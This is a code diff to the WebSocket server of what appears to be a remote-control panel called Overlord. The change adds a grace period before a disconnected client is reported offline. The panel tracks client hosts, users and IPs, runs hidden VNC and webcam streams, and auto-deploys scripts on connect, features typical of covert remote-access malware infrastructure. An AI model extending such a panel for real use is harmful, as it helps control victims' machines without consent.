@@ -20,6 +20,67 @@ import { clearClientSyncState, handleFrame, handleHello, handlePing, handlePong 
 import { getMaxPayloadLimit, getMessageByteLength, isAllowedClientMessageType } from "../../wsValidation";
 import { stopAllProxiesForClient } from "../socks5-proxy-manager";
 
+const OFFLINE_GRACE_MS = (() => {
+  const raw = process.env.OVERLORD_OFFLINE_GRACE_MS;
+  if (raw === undefined || raw === "") return 7_000;
+  const n = Number(raw);
+  if (!Number.isFinite(n) || n < 0) return 7_000;
+  return Math.floor(n);
+})();
+
+type ClientLifecyclePayload = {
+  id: string;
+  host?: string;
+  user?: string;
+  os?: string;
+  ip?: string;
+  country?: string;
+};
+
+type PendingOffline = {
+  timer: ReturnType<typeof setTimeout>;
+};
+
+const pendingOffline = new Map<string, PendingOffline>();
+
+function cancelPendingOffline(clientId: string): boolean {
+  const pending = pendingOffline.get(clientId);
+  if (!pending) return false;
+  clearTimeout(pending.timer);
+  pendingOffline.delete(clientId);
+  return true;
+}
+
+function schedulePendingOffline(
+  clientId: string,
+  payload: ClientLifecyclePayload,
+  disconnectReason: string | undefined,
+  disconnectDetail: string | undefined,
+  deps: WsLifecycleDeps,
+): void {
+  cancelPendingOffline(clientId);
+
+  if (OFFLINE_GRACE_MS <= 0) {
+    deps.notifyDashboardClientEvent("client_offline", payload);
+    deps.broadcastClientEvent("client_offline", payload);
+    setOnlineState(clientId, false, disconnectReason, disconnectDetail);
+    deps.notifyRemoteDesktopStatus(clientId, "offline", "Client disconnected");
+    deps.notifyDashboard();
+    return;
+  }
+
+  const timer = setTimeout(() => {
+    pendingOffline.delete(clientId);
+    deps.notifyDashboardClientEvent("client_offline", payload);
+    deps.broadcastClientEvent("client_offline", payload);
+    setOnlineState(clientId, false, disconnectReason, disconnectDetail);
+    deps.notifyRemoteDesktopStatus(clientId, "offline", "Client disconnected");
+    deps.notifyDashboard();
+  }, OFFLINE_GRACE_MS);
+
+  pendingOffline.set(clientId, { timer });
+}
+
 type PendingScript = {
   timeout: ReturnType<typeof setTimeout>;
   resolve: (value: { ok?: boolean; result?: string; error?: string }) => void;
@@ -457,26 +518,30 @@ export async function handleWebSocketMessage(
         await handleHello(infoObj, payload, ws, ip);
         clientManager.addClient(infoObj.id, infoObj);
 
+        const reconnectedWithinGrace = cancelPendingOffline(infoObj.id);
+
         deps.dispatchAutoScriptsForConnection(infoObj, ws);
         deps.dispatchAutoDeploysForConnection(infoObj, ws);
         deps.dispatchAutoLoadPlugins(infoObj);
         deps.notifyDashboard();
-        deps.notifyDashboardClientEvent("client_online", {
-            id: infoObj.id,
-            host: infoObj.host,
-            user: infoObj.user,
-            os: infoObj.os,
-            ip: infoObj.ip,
-            country: infoObj.country,
-          });
-        deps.broadcastClientEvent("client_online", {
-            id: infoObj.id,
-            host: infoObj.host,
-            user: infoObj.user,
-            os: infoObj.os,
-            ip: infoObj.ip,
-            country: infoObj.country,
-          });
+        if (!reconnectedWithinGrace) {
+          deps.notifyDashboardClientEvent("client_online", {
+              id: infoObj.id,
+              host: infoObj.host,
+              user: infoObj.user,
+              os: infoObj.os,
+              ip: infoObj.ip,
+              country: infoObj.country,
+            });
+          deps.broadcastClientEvent("client_online", {
+              id: infoObj.id,
+              host: infoObj.host,
+              user: infoObj.user,
+              os: infoObj.os,
+              ip: infoObj.ip,
+              country: infoObj.country,
+            });
+        }
         if (infoObj.role === "client") {
           deps.notifyRemoteDesktopStatus(resolvedId, "online");
           metrics.recordConnection();
@@ -802,25 +867,6 @@ export function handleWebSocketClose(
     return;
   }
 
-  if (role === "client" && currentClient) {
-    deps.notifyDashboardClientEvent("client_offline", {
-      id: clientId,
-      host: currentClient.host,
-      user: currentClient.user,
-      os: currentClient.os,
-      ip: currentClient.ip,
-      country: currentClient.country,
-    });
-    deps.broadcastClientEvent("client_offline", {
-      id: clientId,
-      host: currentClient.host,
-      user: currentClient.user,
-      os: currentClient.os,
-      ip: currentClient.ip,
-      country: currentClient.country,
-    });
-  }
-
   const storedDisconnectReason = ws.data.disconnectReason;
   const storedDisconnectDetail = ws.data.disconnectDetail;
 
@@ -828,7 +874,6 @@ export function handleWebSocketClose(
   stopAllProxiesForClient(clientId);
   clearClientSyncState(clientId);
   deps.notifyConsoleClosed(clientId, "Client disconnected");
-  setOnlineState(clientId, false, storedDisconnectReason, storedDisconnectDetail);
   deps.clearPendingNotificationScreenshots(clientId);
   deps.clearClientPluginState(clientId);
   for (const [cmdId, pending] of deps.pendingScripts) {
@@ -848,11 +893,26 @@ export function handleWebSocketClose(
   deps.rdStreamingState.delete(clientId);
   deps.hvncStreamingState.delete(clientId);
   deps.webcamStreamingState.delete(clientId);
-  deps.notifyDashboard();
   logger.info(`[close] ${clientId} code=${code} reason=${reason} disconnect_reason=${storedDisconnectReason || "unknown"}`);
 
+  if (role === "client" && currentClient) {
+    schedulePendingOffline(
+      clientId,
+      {
+        id: clientId,
+        host: currentClient.host,
+        user: currentClient.user,
+        os: currentClient.os,
+        ip: currentClient.ip,
+        country: currentClient.country,
+      },
+      storedDisconnectReason,
+      storedDisconnectDetail,
+      deps,
+    );
+  }
+
   if (role === "client") {
-    deps.notifyRemoteDesktopStatus(clientId, "offline", "Client disconnected");
     metrics.recordDisconnection();
     logAudit({
       timestamp: Date.now(),
